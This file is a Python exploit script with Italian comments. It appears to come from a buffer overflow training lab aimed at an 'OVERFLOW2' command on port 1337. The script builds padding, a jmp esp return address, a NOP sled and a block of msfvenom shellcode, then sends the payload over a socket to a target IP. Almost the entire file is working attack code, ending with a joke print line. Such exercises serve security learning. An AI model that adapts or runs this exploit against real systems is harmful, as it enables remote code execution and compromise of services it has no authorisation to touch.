import socket 
import struct # Necessario per convertire l'indirizzo EIP in byte

ip = "192.168.1.11" # Sostituire con l'IP target 

port = 1337
timeout = 5 


padding = b"A" * 634 
# Indirizzo del gadget jmp esp (0x625011af), formattato come little-endian 
eip = struct.pack('<I', 0x625011af)
# Istruzioni NOP (No OPeration - 0x90) per dare 'spazio' allo shellcode 
nops = b"\x90" * 32


# Shellcode generato da msfvenom (sostituire con il proprio) 
buf =  b""
buf += b"\xfc\xbb\x9d\xa9\x31\x9c\xeb\x0c\x5e\x56\x31\x1e"
buf += b"\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff"
buf += b"\xff\x61\x41\xb3\x9c\x99\x92\xd4\x15\x7c\xa3\xd4"
buf += b"\x42\xf5\x94\xe4\x01\x5b\x19\x8e\x44\x4f\xaa\xe2"
buf += b"\x40\x60\x1b\x48\xb7\x4f\x9c\xe1\x8b\xce\x1e\xf8"
buf += b"\xdf\x30\x1e\x33\x12\x31\x67\x2e\xdf\x63\x30\x24"
buf += b"\x72\x93\x35\x70\x4f\x18\x05\x94\xd7\xfd\xde\x97"
buf += b"\xf6\x50\x54\xce\xd8\x53\xb9\x7a\x51\x4b\xde\x47"
buf += b"\x2b\xe0\x14\x33\xaa\x20\x65\xbc\x01\x0d\x49\x4f"
buf += b"\x5b\x4a\x6e\xb0\x2e\xa2\x8c\x4d\x29\x71\xee\x89"
buf += b"\xbc\x61\x48\x59\x66\x4d\x68\x8e\xf1\x06\x66\x7b"
buf += b"\x75\x40\x6b\x7a\x5a\xfb\x97\xf7\x5d\x2b\x1e\x43"
buf += b"\x7a\xef\x7a\x17\xe3\xb6\x26\xf6\x1c\xa8\x88\xa7"
buf += b"\xb8\xa3\x25\xb3\xb0\xee\x21\x70\xf9\x10\xb2\x1e"
buf += b"\x8a\x63\x80\x81\x20\xeb\xa8\x4a\xef\xec\xcf\x60"
buf += b"\x57\x62\x2e\x8b\xa8\xab\xf5\xdf\xf8\xc3\xdc\x5f"
buf += b"\x93\x13\xe0\xb5\x34\x43\x4e\x66\xf5\x33\x2e\xd6"
buf += b"\x9d\x59\xa1\x09\xbd\x62\x6b\x22\x54\x99\xfc\x8d"
buf += b"\x01\xa0\x98\x65\x50\xa2\x64\xa4\xdd\x44\x0e\x58"
buf += b"\x88\xdf\xa7\xc1\x91\xab\x56\x0d\x0c\xd6\x59\x85"
buf += b"\xa3\x27\x17\x6e\xc9\x3b\xc0\x9e\x84\x61\x47\xa0"
buf += b"\x32\x0d\x0b\x33\xd9\xcd\x42\x28\x76\x9a\x03\x9e"
buf += b"\x8f\x4e\xbe\xb9\x39\x6c\x43\x5f\x01\x34\x98\x9c"
buf += b"\x8c\xb5\x6d\x98\xaa\xa5\xab\x21\xf7\x91\x63\x74"
buf += b"\xa1\x4f\xc2\x2e\x03\x39\x9c\x9d\xcd\xad\x59\xee"
buf += b"\xcd\xab\x65\x3b\xb8\x53\xd7\x92\xfd\x6c\xd8\x72"
buf += b"\x0a\x15\x04\xe3\xf5\xcc\x8c\x03\x14\xc4\xf8\xab"
buf += b"\x81\x8d\x40\xb6\x31\x78\x86\xcf\xb1\x88\x77\x34"
buf += b"\xa9\xf9\x72\x70\x6d\x12\x0f\xe9\x18\x14\xbc\x0a"
buf += b"\x09\x14\x42\xf5\xb2"


# Costruzione del payload finale 
payload = padding + eip + nops + buf


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
s.settimeout(timeout) 
con = s.connect((ip, port)) 
s.recv(1024) 

# Connessione e invio 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
s.settimeout(timeout) 
con = s.connect((ip, port)) 
s.recv(1024) 
s.send(b"OVERFLOW2 " + payload) 
s.recv(1024) # Potrebbe ricevere qualcosa o andare in timeout 
s.close()

print("Daniele Leader Supremo!")